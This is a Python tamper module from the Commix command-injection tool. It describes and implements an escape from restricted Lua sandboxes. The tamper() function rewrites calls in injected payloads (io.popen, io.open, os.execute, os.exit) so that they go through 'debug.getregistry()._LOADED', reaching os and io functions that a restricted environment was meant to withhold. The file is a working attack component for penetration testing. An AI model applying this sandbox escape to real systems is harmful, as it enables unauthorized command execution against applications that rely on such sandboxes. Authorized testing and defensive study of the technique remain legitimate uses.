#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Reaches the payload's own os/io calls through the debug library's registry, for a sink
       evaluating Lua with a restricted environment that leaves 'os' and 'io' out of it.
Notes: This tamper script works against target(s) evaluating Lua (i.e. option '--eval=lua').
       'load(code, name, mode, restricted_env)' is a common way to run a rule or a script without
       giving it the real globals - but 'debug' reads past that regardless of what the environment
       itself holds, and the standard library modules a restricted environment left out are still
       sitting in 'package.loaded', loaded there once at the interpreter's own startup rather than
       read back out of whichever table the sandboxed code was handed as its '_ENV'.
Reference: https://www.exploit-db.com/exploits/33028 (same shape against JRuby's own sandbox: a
           module missing from the restricted environment still reachable through introspection)
"""

__tamper__ = "luadebugescape"
__priority__ = settings.PRIORITY.NORMAL

def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "lua")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Where the real standard library still sits, regardless of what a restricted '_ENV' was built
# with - loaded once at startup, not read back out of whatever table the sandboxed code was given.
_REGISTRY = "debug.getregistry()._LOADED."

def tamper(payload):
  if settings.EVAL_GRAMMAR.NAME != "lua":
    return payload
  for call in ("io.popen(", "io.open(", "os.execute(", "os.exit("):
    payload = payload.replace(call, _REGISTRY + call)
  return payload

# eof
